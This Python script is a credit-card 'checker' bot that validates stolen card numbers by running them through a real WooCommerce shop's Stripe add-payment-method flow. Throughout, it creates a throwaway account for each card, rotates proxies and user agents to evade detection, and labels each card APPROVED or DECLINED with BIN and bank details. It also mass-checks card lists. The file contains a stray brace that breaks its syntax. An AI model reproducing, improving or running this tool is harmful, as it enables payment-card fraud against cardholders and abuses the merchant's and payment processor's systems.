import requests
import os
import re
import random
import string
import time
import json
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Headers for Stripe request
stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

def get_rotating_user_agent():
    """Generate different types of user agents"""
    agents = [
        generate_user_agent(device_type='desktop'),
        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
        generate_user_agent(device_type='desktop', os=('win',)),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def generate_random_email():
    """Generate random email for each account"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def parse_proxy(proxy_str):
    """Parse proxy string into components"""
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}'
        }
    else:
        # If no auth, use without credentials
        ip, port = parts[0], parts[1]
        return {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}'
        }

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def create_new_account(session, proxy_str):
    """Create a new account for each card with proxy"""
    try:
        proxies = parse_proxy(proxy_str)
        
        # Step 1: Get login nonce
        login_page_res = session.get('https://orevaa.com/my-account/', proxies=proxies, timeout=30)
        
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            return False, "Failed to get login nonce"
        login_nonce = login_nonce_match.group(1)

        # Step 2: Register a new account with random email ONLY
        random_email = generate_random_email()
        
        register_data = {
            'email': random_email, 
            'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/my-account/', 
            'register': 'Register',
        }
        
        reg_response = session.post('https://orevaa.com/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
        
        # Check if registration was successful
        if reg_response.status_code in [302, 303]:
            return True, "Account created"
        else:
            return True, "Account might be created"
            
    except Exception as e:
        return False, f"Account error: {str(e)}"

def get_payment_nonce(session, proxy_str):
    """Get payment nonce from the payment method page with proxy"""
    try:
        proxies = parse_proxy(proxy_str)
        
        payment_page_res = session.get('https://orevaa.com/my-account/add-payment-method/', proxies=proxies, timeout=30)
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            return None, "Failed to get payment nonce"
        
        ajax_nonce = payment_nonce_match.group(1)
        return ajax_nonce, "Success"
    except Exception as e:
        return None, f"Payment nonce error: {str(e)}"

def get_3ds_challenge_mandated(setup_intent_id, proxy_str):
    """Extract acsChallengeMandated value from 3DS authentication response"""
    try:
        proxies = parse_proxy(proxy_str)
        
        # Make request to get 3DS details
        headers = stripe_headers.copy()
        headers['user-agent'] = get_rotating_user_agent()
        
        response = requests.get(
            f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}',
            headers=headers,
            proxies=proxies,
            timeout=30
        )
        
        if response.status_code == 200:
            setup_intent_data = response.json()
            
            # Check for next_action and 3DS details
            next_action = setup_intent_data.get('next_action', {})
            if next_action.get('type') == 'use_stripe_sdk':
                three_d_secure_2 = next_action.get('use_stripe_sdk', {}).get('three_d_secure_2')
                if three_d_secure_2:
                    # Get the 3DS2 authentication details
                    three_ds_id = three_d_secure_2.get('three_d_secure_2')
                    if three_ds_id:
                        # Fetch 3DS authentication details
                        three_ds_response = requests.get(
                            f'https://api.stripe.com/v1/3ds2/authenticate/{three_ds_id}',
                            headers=headers,
                            proxies=proxies,
                            timeout=30
                        )
                        
                        if three_ds_response.status_code == 200:
                            three_ds_data = three_ds_response.json()
                            ares = three_ds_data.get('ares', {})
                            acs_challenge_mandated = ares.get('acsChallengeMandated', 'N')
                            return acs_challenge_mandated
            
            # Alternative method: check for redirect_to_url (fallback 3DS)
            redirect_to_url = next_action.get('redirect_to_url', {})
            if redirect_to_url.get('url'):
                return 'Y'  # If redirect exists, challenge is mandated
        
        return 'N'
    except Exception as e:
        print(f"3DS challenge check error: {str(e)}")
        return 'N'

def get_final_message(website_response, setup_intent_id=None, proxy_str=None):
    """Extract final user-friendly message from response with 3DS info"""
    try:
        if website_response.get('success'):
            data_section = website_response.get('data', {})
            status = data_section.get('status', '')
            
            if status == 'succeeded':
                return "Payment method successfully added."
            elif status == 'requires_action':
                # Get 3DS challenge mandated info
                acs_challenge_mandated = 'N'
                if setup_intent_id and proxy_str:
                    acs_challenge_mandated = get_3ds_challenge_mandated(setup_intent_id, proxy_str)
                
                return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
            else:
                return "Payment method status unknown."
        else:
            # Extract error message
            error_data = website_response.get('data', {})
            if 'error' in error_data:
                error_msg = error_data['error'].get('message', 'Declined')
                # Simplify common error messages
                if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                    return "Your card's security code is incorrect."
                elif 'declined' in error_msg.lower():
                    return "Your card was declined."
                elif 'insufficient' in error_msg.lower():
                    return "Your card has insufficient funds."
                elif 'expired' in error_msg.lower():
                    return "Your card has expired."
                else:
                    return error_msg
            else:
                return "Card declined."
    except:
        return "Unknown response"

def get_bin_info(bin_number):
    """Get BIN information with multiple fallback sources"""
    if not bin_number or len(bin_number) < 6:
        return get_accurate_bin_info(bin_number)
    
    # Try multiple BIN lookup services
    bin_info = try_binlist_net(bin_number)
    if bin_info and bin_info.get('bank') not in ['UNKNOWN', 'MAJOR BANK']:
        return bin_info
    
    bin_info = try_binlist_cc(bin_number)
    if bin_info and bin_info.get('bank') not in ['UNKNOWN', 'MAJOR BANK']:
        return bin_info
    
    bin_info = try_bins_su(bin_number)
    if bin_info and bin_info.get('bank') not in ['UNKNOWN', 'MAJOR BANK']:
        return bin_info
    
    # Final fallback with more accurate data
    return get_accurate_bin_info(bin_number)

def try_binlist_net(bin_number):
    """Try binlist.net API"""
    try:
        response = requests.get(
            f'https://lookup.binlist.net/{bin_number}', 
            timeout=5,
            headers={
                "Accept-Version": "3", 
                "User-Agent": get_rotating_user_agent()
            }
        )
        if response.status_code == 200:
            data = response.json()
            return format_binlist_data(data)
    except:
        pass
    return None

def try_binlist_cc(bin_number):
    """Try binlist.cc API (alternative)"""
    try:
        response = requests.get(
            f'https://binlist.cc/lookup/{bin_number}/',
            timeout=5,
            headers={"User-Agent": get_rotating_user_agent()}
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return {
                    'brand': data.get('scheme', 'UNKNOWN').upper(),
                    'type': data.get('type', 'CREDIT').upper(),
                    'level': data.get('brand', data.get('scheme', 'UNKNOWN')).upper(),
                    'bank': data.get('bank', {}).get('name', 'UNKNOWN'),
                    'country': data.get('country', {}).get('name', 'UNITED STATES'),
                    'emoji': data.get('country', {}).get('emoji', '🇺🇸')
                }
    except:
        pass
    return None

def try_bins_su(bin_number):
    """Try bins.su API"""
    try:
        response = requests.get(
            f'https://bins.su/api?bins={bin_number}',
            timeout=5,
            headers={"User-Agent": get_rotating_user_agent()}
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('result') == 'success' and bin_number in data.get('bins', {}):
                bin_data = data['bins'][bin_number]
                return {
                    'brand': bin_data.get('brand', 'UNKNOWN').upper(),
                    'type': bin_data.get('type', 'CREDIT').upper(),
                    'level': bin_data.get('level', 'STANDARD').upper(),
                    'bank': bin_data.get('bank', 'UNKNOWN'),
                    'country': bin_data.get('country', 'UNITED STATES'),
                    'emoji': get_country_emoji(bin_data.get('country', 'US'))
                }
    except:
        pass
    return None

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    # Convert to uppercase and get emoji
    country_code = country_code.upper()
    return ''.join(chr(127397 + ord(char)) for char in country_code)

def format_binlist_data(data):
    """Format data from binlist APIs"""
    bank_name = data.get('bank', {}).get('name', 'UNKNOWN')
    if bank_name in ['', 'UNKNOWN', None]:
        bank_name = get_bank_from_bin_pattern(data.get('scheme', ''))
    
    country_name = data.get('country', {}).get('name', 'UNITED STATES')
    country_emoji = data.get('country', {}).get('emoji', '🇺🇸')
    
    brand = data.get('scheme', 'UNKNOWN').upper()
    if brand == 'UNKNOWN':
        brand = get_bin_brand_from_pattern(data.get('bin', ''))
    
    card_type = data.get('type', 'CREDIT').upper()
    card_level = data.get('brand', data.get('scheme', 'UNKNOWN')).upper()
    
    return {
        'brand': brand,
        'type': card_type,
        'level': card_level,
        'bank': bank_name,
        'country': country_name,
        'emoji': country_emoji
    }


def get_bank_from_bin_pattern(scheme):
    """Get better bank name from scheme"""
    scheme_lower = scheme.lower() if scheme else ''
    if 'visa' in scheme_lower:
        return 'VISA BANK'
    elif 'mastercard' in scheme_lower or 'master' in scheme_lower:
        return 'MASTERCARD BANK'
    elif 'amex' in scheme_lower or 'american' in scheme_lower:
        return 'AMERICAN EXPRESS'
    elif 'discover' in scheme_lower:
        return 'DISCOVER BANK'
    elif 'unionpay' in scheme_lower:
        return 'UNIONPAY BANK'
    else:
        return 'MAJOR BANK'

def get_accurate_bin_info(bin_number):
    """More accurate fallback with better bank detection"""
    if not bin_number or len(bin_number) < 6:
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    
    brand = get_bin_brand_from_pattern(bin_number)
    
    # Better bank detection based on BIN patterns
    bank = detect_bank_from_bin(bin_number, brand)
    country = detect_country_from_bin(bin_number)
    emoji = get_country_emoji(country)
    
    return {
        'brand': brand,
        'type': 'CREDIT',
        'level': 'STANDARD',
        'bank': bank,
        'country': country,
        'emoji': emoji
    }
}

def detect_bank_from_bin(bin_number, brand):
    """Detect bank based on BIN patterns"""
    first_digit = bin_number[0]
    first_two = bin_number[:2]
    first_four = bin_number[:4]
    
    # Major US banks BIN patterns
    if first_four in ['4266', '4267', '4268']:
        return 'BANK OF AMERICA'
    elif first_four in ['5125', '5135', '5145']:
        return 'CAPITAL ONE'
    elif first_four in ['6011', '6221']:
        return 'CHASE BANK'
    elif first_four in ['5424', '3742']:
        return 'CITIBANK'
    elif first_four in ['4532', '4556']:
        return 'WELLS FARGO'
    elif first_two in ['51', '52', '53', '54', '55']:
        return 'MASTERCARD BANK'
    elif first_digit == '4':
        return 'VISA BANK'
    elif first_two in ['34', '37']:
        return 'AMERICAN EXPRESS'
    elif first_digit == '6':
        return 'DISCOVER BANK'
    else:
        return f'{brand} ISSUING BANK'

def detect_country_from_bin(bin_number):
    """Detect country based on BIN patterns"""
    first_digit = bin_number[0]
    first_three = bin_number[:3]
    
    # Basic country detection based on BIN ranges
    if first_digit == '4':  # Visa - often US
        return 'UNITED STATES'
    elif first_digit in ['5', '2']:  # Mastercard - global
        return 'UNITED STATES'
    elif first_three in ['304', '305', '36']:  # Diners Club
        return 'UNITED STATES'
    elif first_digit == '3':  # Amex, JCB
        if bin_number[:2] in ['34', '37']:
            return 'UNITED STATES'
        else:
            return 'JAPAN'
    elif first_digit == '6':  # Discover
        return 'UNITED STATES'
    else:
        return 'UNITED STATES'

def get_bin_brand_from_pattern(bin_number):
    """Basic brand detection"""
    if bin_number.startswith('4'):
        return 'VISA'
    elif bin_number.startswith('5'):
        return 'MASTERCARD'
    elif bin_number.startswith('34') or bin_number.startswith('37'):
        return 'AMEX'
    elif bin_number.startswith('6'):
        return 'DISCOVER'
    elif bin_number.startswith('35'):
        return 'JCB'
    elif bin_number.startswith('30') or bin_number.startswith('36') or bin_number.startswith('38'):
        return 'DINERS CLUB'
    else:
        return 'UNKNOWN'

def check_card_stripe(cc_line):
    """Main function to check card via Stripe (single card)"""
    start_time = time.time()
    
    try:
        # Parse CC
        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy
        
        # Load proxies
        proxies_list = load_proxies()
        if not proxies_list:
            return "❌ No proxies available"
        
        # Use random proxy
        proxy_str = random.choice(proxies_list)
        
        session = requests.Session()
        session.headers.update({
            'user-agent': get_rotating_user_agent()
        })

        if len(yy) == 4:
            yy_stripe = yy[-2:]
        else:
            yy_stripe = yy

        # Create a NEW account for this card
        account_created, account_msg = create_new_account(session, proxy_str)
        if not account_created:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Get payment nonce
        ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
        if not ajax_nonce:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Prepare Stripe data with the current card
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page=293254&client_attribution_metadata[client_session_id]=dd158add-28af-4b7c-935c-a60ace5af345&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=15bdff4a-ba92-40aa-94e4-f0e376053c81&guid=6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa&muid=2c200dbe-43a4-4a5f-a742-4d870099146696a4b8&sid=a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'

        proxies = parse_proxy(proxy_str)
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, proxies=proxies, timeout=30)

        # Check if response has 'id' before extracting
        response_data = response.json()
        
        if 'id' in response_data:
            pm_id = response_data['id']
            
            # Second request (admin ajax)
            headers2 = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://orevaa.com',
                'priority': 'u=1, i',
                'referer': 'https://orevaa.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': get_rotating_user_agent(),
                'x-requested-with': 'XMLHttpRequest',
            }

            data2 = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }

            response2 = session.post('https://orevaa.com/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
            website_response = response2.json()
            
            # Extract setup intent ID for 3DS check
            setup_intent_id = None
            if website_response.get('success'):
                data_section = website_response.get('data', {})
                setup_intent_id = data_section.get('id')
            
            # Get final message with 3DS info
            final_message = get_final_message(website_response, setup_intent_id, proxy_str)
            
            elapsed_time = time.time() - start_time
            bin_info = get_bin_info(n[:6]) or {}
            
            # Check the actual status from the response
            if website_response.get('success'):
                data_section = website_response.get('data', {})
                status = data_section.get('status', '')
                
                if status == 'succeeded':
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                elif status == 'requires_action':
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                # Check for specific error messages that should be treated as APPROVED
                error_data = website_response.get('data', {})
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', '').lower()
                    
                    # Treat these errors as APPROVED
                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
                        return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
        else:
            elapsed_time = time.time() - start_time
            bin_info = get_bin_info(n[:6]) or {}
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe validation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_stripe(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_stripe(cc_line)
        results.append(result)
        time.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Test with a single card
    test_cc = "4111111111111111|12|2025|123"
    print("Testing Stripe checker...")
    result = check_card_stripe(test_cc)
    print(result)
